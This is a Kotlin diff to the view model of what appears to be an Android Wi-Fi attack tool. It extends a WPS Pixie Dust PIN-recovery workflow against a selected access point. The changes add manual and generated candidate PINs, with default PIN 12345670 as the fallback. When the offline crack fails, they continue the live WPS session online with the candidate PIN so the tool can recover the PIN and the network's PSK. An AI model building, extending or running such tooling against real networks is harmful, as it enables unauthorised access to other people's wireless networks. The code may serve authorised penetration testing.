@@ -48,6 +48,7 @@ data class WpsPixieLiveUiState(
     val error: String? = null,
     val locked: Boolean = false,
     val autoRetryUsed: Boolean = false,
+    val lastAttemptCaptureOnly: Boolean = false,
     val retryCountdownSeconds: Int? = null,
     val progressLog: List<WpsPixieLiveLogEntry> = emptyList(),
 )
@@ -208,11 +209,66 @@ internal fun MainViewModel.selectWpsTargetImpl(target: NetworkTarget) {
                 if (generated != null) "Generated likely PIN from BSSID OUI." else "Using fallback PIN 12345670."
             },
             autoRetryUsed = false,
+            lastAttemptCaptureOnly = false,
             progressLog = emptyList(),
         )
     }
     logWpsPixieLive("Selected ${target.ssid.ifBlank { "(hidden)" }}.")
     logWpsPixieLive("Candidate PIN $candidatePin from ${source.name.lowercase()}.")
+}
+
+internal fun MainViewModel.setWpsCandidatePinImpl(value: String) {
+    if (_wpsPixieLive.value.running) return
+    val normalized = value.filter { it.isDigit() }.take(8)
+    _wpsPixieLive.update { state ->
+        state.copy(
+            candidatePin = normalized,
+            candidateSource = WpsPinSource.MANUAL,
+            material = null,
+            firstHalfValid = null,
+            recoveredPin = null,
+            psk = null,
+            error = null,
+            locked = false,
+            stage = "",
+            message = if (normalized.length == 4 || normalized.length == 8) {
+                "Manual PIN ready for full M4-M8 validation."
+            } else {
+                "Enter a 4- or 8-digit WPS PIN."
+            },
+            autoRetryUsed = false,
+            retryCountdownSeconds = null,
+        )
+    }
+    logWpsPixieLive("Candidate PIN changed to ${normalized.ifBlank { "(empty)" }} (manual).")
+}
+
+internal fun MainViewModel.useGeneratedWpsPinImpl() {
+    if (_wpsPixieLive.value.running) return
+    val target = _wpsPixieLive.value.selectedTarget ?: return
+    val generated = WpsPinGenerator.getLikely(target.bssid)
+    val pin = generated ?: "12345670"
+    _wpsPixieLive.update { state ->
+        state.copy(
+            candidatePin = pin,
+            candidateSource = WpsPinSource.GENERATED,
+            material = null,
+            firstHalfValid = null,
+            recoveredPin = null,
+            psk = null,
+            error = null,
+            locked = false,
+            stage = "",
+            message = if (generated != null) {
+                "Generated likely PIN restored."
+            } else {
+                "Fallback PIN 12345670 restored."
+            },
+            autoRetryUsed = false,
+            retryCountdownSeconds = null,
+        )
+    }
+    logWpsPixieLive("Candidate PIN reset to generated value $pin.")
 }
 
 internal fun MainViewModel.startWpsPixieLiveAttemptImpl(
@@ -264,6 +320,7 @@ internal fun MainViewModel.startWpsPixieLiveAttemptImpl(
             firstHalfValid = null,
             recoveredPin = if (automaticRetry) it.recoveredPin else null,
             autoRetryUsed = if (automaticRetry) it.autoRetryUsed else false,
+            lastAttemptCaptureOnly = captureOnly,
             retryCountdownSeconds = null,
         )
     }
@@ -395,6 +452,7 @@ internal fun MainViewModel.handleWpsPixieLiveEventImpl(event: JSONObject) {
                     },
                     stage = if (m3Only) "m3-captured" else "wrong-pin",
                     message = message,
+                    lastAttemptCaptureOnly = m3Only,
                 )
             }
             logWpsPixieLive(
@@ -518,13 +576,78 @@ private fun MainViewModel.startAutomaticWpsPixieCrack(material: WpsPixieCaptured
                 )
             }
             if (recovered == null) {
-                appendLog("WPS Pixie: offline PIN search found no match.", level = LogLevel.ERROR)
+                val fallbackPin = state.candidatePin.trim()
+                val canTryCandidateOnline =
+                    state.lastAttemptCaptureOnly &&
+                        (fallbackPin.length == 4 || fallbackPin.length == 8)
+
+                if (!canTryCandidateOnline) {
+                    appendLog("WPS Pixie: offline PIN search found no match.", level = LogLevel.ERROR)
+                    _wpsPixieLive.update {
+                        it.copy(
+                            running = false,
+                            error = "Offline Pixie Dust crack found no PIN. AP may be locked or material is invalid.",
+                        )
+                    }
+                    return@launch
+                }
+
+                // The AP is not Pixie-vulnerable, but the candidate PIN may
+                // still be correct. The firmware still holds the M3 session;
+                // validate the original candidate online before giving up.
+                logWpsPixieLive(
+                    "Offline search found no PIN; trying candidate PIN $fallbackPin online.",
+                )
+                appendLog(
+                    "WPS Pixie: offline search found no PIN; continuing the active session with candidate PIN $fallbackPin.",
+                )
                 _wpsPixieLive.update {
                     it.copy(
-                        running = false,
-                        error = "Offline Pixie Dust crack found no PIN. AP may be locked or material is invalid.",
+                        running = true,
+                        stage = "continuing",
+                        message = "No offline PIN match; verifying the candidate PIN online...",
+                        retryCountdownSeconds = null,
+                        error = null,
                     )
                 }
+                val activeSession = session
+                val runId = _wpsPixieLive.value.runId
+                if (activeSession == null || runId.isNullOrBlank()) {
+                    _wpsPixieLive.update {
+                        it.copy(running = false, error = "WPS session is no longer available.")
+                    }
+                    return@launch
+                }
+                val response = runCatching {
+                    activeSession.sendCommand(
+                        "WPS_PIXIE_CONTINUE",
+                        JSONObject().apply {
+                            put("run_id", runId)
+                            put("pin", fallbackPin)
+                            put(
+                                "pin_source",
+                                state.candidateSource?.name?.lowercase() ?: "generated",
+                            )
+                        },
+                        timeoutMs = 5_000,
+                    )
+                }.getOrNull()
+                if (response?.optBoolean("ok") != true) {
+                    val code = response?.optString("error").orEmpty().ifBlank {
+                        response?.optString("msg").orEmpty()
+                    }
+                    val message = code.ifBlank {
+                        "Firmware could not validate the candidate PIN online."
+                    }
+                    _wpsPixieLive.update {
+                        it.copy(running = false, stage = "error", error = message)
+                    }
+                    appendLog("WPS Pixie: $message", level = LogLevel.ERROR)
+                    return@launch
+                }
+                logWpsPixieLive(
+                    "Candidate PIN accepted by firmware; waiting for M5-M8.",
+                )
                 return@launch
             }
             logWpsPixieLive("Recovered PIN ${recovered.pin}; continuing the active WPS session.")
